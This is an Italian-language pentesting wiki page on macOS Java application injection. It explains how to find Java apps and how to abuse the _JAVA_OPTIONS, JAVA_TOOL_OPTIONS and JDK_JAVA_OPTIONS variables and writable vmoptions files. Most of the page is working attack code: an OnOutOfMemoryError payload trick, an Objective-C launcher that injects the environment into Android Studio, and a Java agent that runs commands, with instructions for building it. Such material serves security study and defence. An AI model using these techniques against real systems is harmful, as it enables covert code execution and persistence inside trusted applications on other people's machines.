# Injection nelle applicazioni Java di macOS

{{#include ../../../banners/hacktricks-training.md}}

## Enumerazione

Trova le applicazioni Java installate nel sistema. È stato osservato che le app Java nel file **Info.plist** contengono alcuni parametri Java che includono la stringa **`java.`**, quindi puoi cercarla:
```bash
# Search only in /Applications folder
sudo find /Applications -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null

# Full search
sudo find / -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
```
## \_JAVA_OPTIONS

La variabile d'ambiente **`_JAVA_OPTIONS`** può essere utilizzata per iniettare parametri arbitrari della Java VM all'avvio di un'applicazione Java.<sup>[[1]](#references)</sup>

Lo stack di avvio Java riconosce anche due variabili meglio definite, con ambiti diversi:

- `JAVA_TOOL_OPTIONS` viene letta quando la VM viene creata, inclusi alcuni percorsi di avvio incorporati che non passano attraverso il launcher `java`. Può iniettare opzioni di instrumentation come `-javaagent`, `-agentlib` o `-agentpath`.<sup>[[4]](#references)</sup>
- `JDK_JAVA_OPTIONS` viene anteposta dal launcher `java` alla relativa riga di comando. Le opzioni che selezionano la classe principale o terminano il launcher sono vietate, ma `-javaagent` è accettata.<sup>[[5]](#references)</sup>

Tutte e tre le variabili devono essere trattate come controlli di esecuzione del codice della JVM quando un attacker può anche fornire un agent compatibile e leggibile. `_JAVA_OPTIONS` è un dettaglio d'implementazione di HotSpot, quindi deve essere convalidata rispetto al vendor e alla versione esatti; `JAVA_TOOL_OPTIONS` o `JDK_JAVA_OPTIONS` sono preferibili per i test portabili.
```bash
# Write your payload in a script called /tmp/payload.sh
export _JAVA_OPTIONS='-Xms2m -Xmx5m -XX:OnOutOfMemoryError="/tmp/payload.sh"'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
```
Per eseguirlo come nuovo processo e non come processo figlio del terminale corrente, puoi usare:
```objectivec
#import <Foundation/Foundation.h>
// clang -fobjc-arc -framework Foundation invoker.m -o invoker

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Specify the file path and content
NSString *filePath = @"/tmp/payload.sh";
NSString *content = @"#!/bin/bash\n/Applications/iTerm.app/Contents/MacOS/iTerm2";

NSError *error = nil;

// Write content to the file
BOOL success = [content writeToFile:filePath
atomically:YES
encoding:NSUTF8StringEncoding
error:&error];

if (!success) {
NSLog(@"Error writing file at %@\n%@", filePath, [error localizedDescription]);
return 1;
}

NSLog(@"File written successfully to %@", filePath);

// Create a new task
NSTask *task = [[NSTask alloc] init];

/// Set the task's launch path to use the 'open' command
[task setLaunchPath:@"/usr/bin/open"];

// Arguments for the 'open' command, specifying the path to Android Studio
[task setArguments:@[@"/Applications/Android Studio.app"]];

// Define custom environment variables
NSDictionary *customEnvironment = @{
@"_JAVA_OPTIONS": @"-Xms2m -Xmx5m -XX:OnOutOfMemoryError=/tmp/payload.sh"
};

// Get the current environment and merge it with custom variables
NSMutableDictionary *environment = [NSMutableDictionary dictionaryWithDictionary:[[NSProcessInfo processInfo] environment]];
[environment addEntriesFromDictionary:customEnvironment];

// Set the task's environment
[task setEnvironment:environment];

// Launch the task
[task launch];
}
return 0;
}
```
Tuttavia, questa tecnica genera un errore nell'applicazione eseguita. Un'alternativa più furtiva consiste nel creare un Java agent e usare `-javaagent`:<sup>[[2]](#references)</sup>
```bash
export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"

# Or

open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"

# The same agent with the standardized VM initialization variable:
JAVA_TOOL_OPTIONS='-javaagent:/tmp/Agent.jar' java -jar /path/to/application.jar

# Or through the JDK java launcher:
JDK_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar' java -jar /path/to/application.jar
```
> [!CAUTION]
> La creazione dell'agent con una **versione di Java diversa** da quella dell'applicazione può causare il crash sia dell'agent sia dell'applicazione.

Dove può trovarsi l'agent:
```java:Agent.java
import java.io.*;
import java.lang.instrument.*;

public class Agent {
public static void premain(String args, Instrumentation inst) {
try {
String[] commands = new String[] { "/usr/bin/open", "-a", "Calculator" };
Runtime.getRuntime().exec(commands);
}
catch (Exception err) {
err.printStackTrace();
}
}
}
```
Per compilare l'agent, esegui:
```bash
javac Agent.java # Create Agent.class
jar cvfm Agent.jar manifest.txt Agent.class # Create Agent.jar
```
Con `manifest.txt`:
```
Premain-Class: Agent
Agent-Class: Agent
Can-Redefine-Classes: true
Can-Retransform-Classes: true
```
E quindi esporta la variabile d'ambiente ed esegui l'applicazione Java come:
```bash
export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"

# Or

open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
```
## file vmoptions

Questo file supporta la specifica dei **parametri Java** quando Java viene eseguito. Puoi utilizzare alcune delle tecniche precedenti per modificare i parametri Java e **far eseguire al processo comandi arbitrari**.\
Inoltre, questo file può anche **includere altri file** con la direttiva `include`, quindi puoi modificare anche un file incluso.

Inoltre, alcune app Java **caricheranno più di un file `vmoptions`**.

Alcune applicazioni, come Android Studio, indicano nel loro **output dove cercano** questi file:<sup>[[3]](#references)</sup>
```bash
/Applications/Android\ Studio.app/Contents/MacOS/studio 2>&1 | grep vmoptions

2023-12-13 19:53:23.920 studio[74913:581359] fullFileName is: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.920 studio[74913:581359] fullFileName exists: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.920 studio[74913:581359] parseVMOptions: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.921 studio[74913:581359] parseVMOptions: /Applications/Android Studio.app.vmoptions
2023-12-13 19:53:23.922 studio[74913:581359] parseVMOptions: /Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
2023-12-13 19:53:23.923 studio[74913:581359] parseVMOptions: platform=20 user=1 file=/Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
```
Se non lo fanno, puoi verificarlo con:
```bash
# Monitor
sudo eslogger lookup | grep vmoption # Give FDA to the Terminal

# Launch the Java app
/Applications/Android\ Studio.app/Contents/MacOS/studio
```
Nota che Android Studio in questo esempio tenta di caricare **`/Applications/Android Studio.app.vmoptions`**, una posizione in cui qualsiasi utente del gruppo **`admin` ha accesso in scrittura**.

## References

- [1] [OpenJDK — analisi di `_JAVA_OPTIONS` in `arguments.cpp`](https://cr.openjdk.org/~never/bsd_headers/src/share/vm/runtime/arguments.cpp.html)
- [2] [Oracle Java — specifica del package `java.lang.instrument`](https://docs.oracle.com/javase/8/docs/api/java/lang/instrument/package-summary.html)
- [3] [JetBrains — configurazione delle opzioni JVM e delle proprietà della piattaforma](https://intellij-support.jetbrains.com/hc/en-us/articles/206544869-Configuring-JVM-options-and-platform-properties)
- [4] [Oracle Java — `JAVA_TOOL_OPTIONS`](https://docs.oracle.com/javase/8/docs/technotes/guides/troubleshoot/envvars002.html)
- [5] [Il launcher `java` — `JDK_JAVA_OPTIONS`](https://docs.oracle.com/en/java/javase/25/docs/specs/man/java.html#using-the-jdk_java_options-launcher-environment-variable)
{{#include ../../../banners/hacktricks-training.md}}
